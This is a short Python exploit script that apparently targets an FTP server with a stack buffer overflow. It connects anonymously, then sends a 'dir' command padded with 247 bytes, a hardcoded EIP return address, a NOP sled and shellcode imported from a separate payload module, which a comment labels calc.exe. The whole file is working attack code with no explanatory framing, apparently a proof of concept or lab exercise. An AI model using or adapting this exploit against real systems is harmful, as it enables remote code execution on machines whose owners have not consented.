from time import sleep
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):



    ip = target_machine
    port = target_port
    overflow = b'A' * 247
    eip =  b'\xF4\xAF\xEA\x75' + b'\x90' * 10
    #shellcode calc.exe
   

    remotecode = overflow + eip + buf + b'\r\n'
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip ,port))
    s.recv(1024)
    s.send(b'USER anonymous\r\n')
    s.recv(1024)
    s.send(b'REST hacker@hacker.net\r\n')
    s.recv(1024)
   
    message = b'dir ' + remotecode 
    s.send(message)
    s.recv(1024)
    s.close